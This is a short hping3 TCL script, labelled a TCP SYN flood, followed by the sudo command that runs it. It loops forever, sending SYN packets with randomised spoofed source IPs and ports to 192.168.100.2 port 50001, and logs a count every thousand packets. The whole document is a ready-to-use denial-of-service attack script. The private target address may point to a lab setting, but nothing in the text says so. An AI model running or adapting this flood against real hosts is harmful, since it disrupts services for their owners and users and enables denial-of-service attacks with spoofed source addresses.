# Hping3 TCP SYN Flood with TCL script

set dst_ip "192.168.100.2"
set dst_port 50001
set window 8192
set seq 0
set count 0

proc random_ip {} {
    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
}

proc random_port {} {
    return [expr {int(rand()*64512) + 1024}]
}

while {1} {
    set saddr [random_ip]
    set sport [random_port]
    set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+tcp(sport=$sport,dport=$dst_port,flags=s,win=$window,seq=$seq)"
    hping send $pkt
    incr count

    if {[expr {$count % 1000}] == 0} {
        puts "$count TCP SYN packets sent so far..."
    }
}

# Comando: sudo hping3 exec tcp_syn_flood_TCL.htcl